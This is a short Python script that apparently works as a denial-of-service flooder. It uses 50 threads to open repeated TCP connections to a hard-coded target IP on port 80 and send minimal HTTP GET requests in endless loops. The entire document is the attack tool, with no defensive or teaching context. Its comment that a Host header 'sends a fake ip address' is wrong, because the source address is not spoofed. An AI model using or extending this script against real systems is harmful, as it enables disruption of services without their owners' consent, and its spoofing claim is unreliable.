import socket
import threading
from concurrent.futures import ThreadPoolExecutor

target = "192.168.1.1" # target IP address
fake_ip = "182.21.20.32"
port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port)) # connect to the target
        s.send(f"GET /{target} HTTP/1.1\r\n".encode('ascii')) # send a request to the target
        s.send(f"Host: {fake_ip}\r\n\r\n".encode('ascii')) # send a fake ip address
        s.close()

with ThreadPoolExecutor(max_workers=50) as executor:
    for i in range(500):
        executor.submit(attack)
